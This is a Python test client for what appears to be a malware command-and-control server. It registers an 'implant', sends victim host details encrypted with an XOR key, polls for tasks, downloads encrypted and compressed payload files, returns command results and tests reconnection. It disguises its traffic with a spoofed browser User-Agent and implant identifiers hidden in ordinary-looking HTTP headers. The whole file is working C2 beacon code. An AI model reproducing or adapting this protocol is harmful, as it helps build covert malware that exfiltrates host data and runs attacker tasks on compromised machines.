import base64
import sys
import os
import json
import requests
import zlib
from pathlib import Path
from typing import Dict, Any, Optional

class ImplantAPITester:
    def __init__(self, base_url: str, workspace_uuid: Optional[str] = None):
        self.base_url = base_url.rstrip('/')
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko',
            'X-Correlation-ID': 'PASIOnodnoqonasond12314',
            'Content-Type': 'application/json'
        }
        if workspace_uuid:
            self.headers['X-Robots-Tag'] = workspace_uuid
            
        self.implant_id = None
        self.unique_xor_key = None
        self.initial_xor_key = None
        
        # Read INITIAL_XOR_KEY from .xorkey file
        try:
            with open('.xorkey', 'r') as f:
                self.initial_xor_key = int(f.read().strip())
        except FileNotFoundError:
            print("Error: .xorkey file not found")
            sys.exit(1)
        except ValueError:
            print("Error: Key in .xorkey must be an integer")
            sys.exit(1)

    def xor_encrypt(self, data: str, key: int) -> str:
        """XOR encrypt data with key and return base64"""
        encrypted = ''.join(chr(ord(c) ^ key) for c in data)
        return base64.b64encode(encrypted.encode()).decode()

    def xor_decrypt(self, data: str, key: int) -> str:
        """Decode base64 and XOR decrypt data"""
        decoded = base64.b64decode(data.encode()).decode()
        return ''.join(chr(ord(c) ^ key) for c in decoded)

    def register(self) -> Dict[str, Any]:
        """Initial registration request using INITIAL_XOR_KEY"""
        print("\nRegistering new implant...")
        response = requests.get(
            f"{self.base_url}/register",
            headers=self.headers
        )
        
        if response.status_code == 200:
            data = response.json()
            self.implant_id = data['id']
            self.unique_xor_key = int(base64.b64decode(data['k']).decode())
            self.headers['X-Request-ID'] = self.implant_id
            print(f"Got implant ID: {self.implant_id}")
            print(f"Got UNIQUE_XOR_KEY: {self.unique_xor_key}")
            
        return response.json()

    def activate(self, system_info: Dict[str, Any]) -> Dict[str, Any]:
        """Activate implant with system information using UNIQUE_XOR_KEY"""
        if not self.unique_xor_key:
            raise Exception("Must register first to get UNIQUE_XOR_KEY")
            
        encrypted_data = self.xor_encrypt(json.dumps(system_info), self.unique_xor_key)
        
        print("\nActivating implant...")
        response = requests.post(
            f"{self.base_url}/register",
            headers=self.headers,
            json={'data': encrypted_data}
        )
        
        return response.json()

    def get_task(self) -> Dict[str, Any]:
        """Get pending tasks using UNIQUE_XOR_KEY"""
        if not self.unique_xor_key:
            raise Exception("Must register first to get UNIQUE_XOR_KEY")
            
        print("\nChecking for tasks...")
        response = requests.get(
            f"{self.base_url}/task",
            headers=self.headers
        )
        
        if response.status_code == 200:
            encrypted_data = response.json().get('data')
            if encrypted_data:
                decrypted = self.xor_decrypt(encrypted_data, self.unique_xor_key)
                return json.loads(decrypted)
        return response.json()

    def download_file(self, file_id: str, task_guid: str) -> bytes:
        """Download and process file from server"""
        if not self.unique_xor_key:
            raise Exception("Must register first to get UNIQUE_XOR_KEY")
            
        headers = self.headers.copy()
        headers['Content-MD5'] = task_guid
        
        print(f"\nDownloading file {file_id}...")
        response = requests.get(
            f"{self.base_url}/task/{file_id}",
            headers=headers
        )
        
        if response.status_code == 200:
            # Get encrypted filename from header
            enc_filename = response.headers.get('X-Original-Filename')
            if enc_filename:
                filename = self.xor_decrypt(enc_filename, self.unique_xor_key)
                print(f"Original filename: {filename}")
            
            # Process file content
            content = base64.b64decode(response.content)
            decrypted = self.xor_decrypt(content.decode(), self.unique_xor_key)
            decompressed = zlib.decompress(decrypted.encode())
            return decompressed
        
        return response.content

    def submit_result(self, task_guid: str, result: str) -> Dict[str, Any]:
        """Submit command execution result using UNIQUE_XOR_KEY"""
        if not self.unique_xor_key:
            raise Exception("Must register first to get UNIQUE_XOR_KEY")
            
        data = {
            'guid': task_guid,
            'result': base64.b64encode(result.encode()).decode()
        }
        encrypted_data = self.xor_encrypt(json.dumps(data), self.unique_xor_key)
        
        print("\nSubmitting result...")
        response = requests.post(
            f"{self.base_url}/result",
            headers=self.headers,
            json={'data': encrypted_data}
        )
        return response.json()

    def reconnect(self) -> Dict[str, Any]:
        """Test reconnection flow using INITIAL_XOR_KEY for registry ID"""
        if not self.implant_id:
            raise Exception("Must register first to get implant ID")
            
        # Simulate reading encrypted ID from registry
        enc_id = self.xor_encrypt(self.implant_id, self.initial_xor_key)
        # Decrypt ID for X-Request-ID header
        dec_id = self.xor_decrypt(enc_id, self.initial_xor_key)
        
        headers = self.headers.copy()
        headers['X-Request-ID'] = dec_id
        
        print("\nTesting reconnection...")
        response = requests.options(
            f"{self.base_url}/reconnect",
            headers=headers
        )
        
        if response.status_code == 200:
            # Update UNIQUE_XOR_KEY
            data = response.json()
            new_key = base64.b64decode(data['k']).decode()
            self.unique_xor_key = int(new_key)
            print(f"Got new UNIQUE_XOR_KEY: {self.unique_xor_key}")
        elif response.status_code == 410:
            print("Implant marked as inactive")
        
        return response.json()

def main():
    if len(sys.argv) < 3:
        print("Usage: python test_implant_routes.py <endpoint> <server_url> [workspace_uuid]")
        print("\nAvailable endpoints:")
        print("  register")
        print("  task")
        print("  download <file_id> <task_guid>")
        print("  result <task_guid> <result>")
        print("  reconnect")
        sys.exit(1)

    endpoint = sys.argv[1]
    server_url = sys.argv[2]
    workspace_uuid = sys.argv[3] if len(sys.argv) > 3 else None
    
    tester = ImplantAPITester(server_url, workspace_uuid)

    if endpoint == "register":
        # Test full registration flow
        tester.register()
        system_info = {
            "i": "192.168.1.100",
            "u": "testuser",
            "h": "TEST-PC",
            "o": "Windows 10",
            "p": 1234,
            "P": "test.exe",
            "r": True
        }
        tester.activate(system_info)
    
    elif endpoint == "task":
        tester.register()  # Need to register first
        tester.get_task()
    
    elif endpoint == "download":
        if len(sys.argv) < 5:
            print("Error: download requires <file_id> and <task_guid>")
            sys.exit(1)
        tester.register()  # Need to register first
        content = tester.download_file(sys.argv[3], sys.argv[4])
        print(f"Downloaded content length: {len(content)} bytes")
    
    elif endpoint == "result":
        if len(sys.argv) < 5:
            print("Error: result requires <task_guid> and <result>")
            sys.exit(1)
        tester.register()  # Need to register first
        tester.submit_result(sys.argv[3], sys.argv[4])
    
    elif endpoint == "reconnect":
        tester.register()  # Need to register first
        tester.reconnect()
    
    else:
        print(f"Error: Unknown endpoint: {endpoint}")
        sys.exit(1)

if __name__ == "__main__":
    main()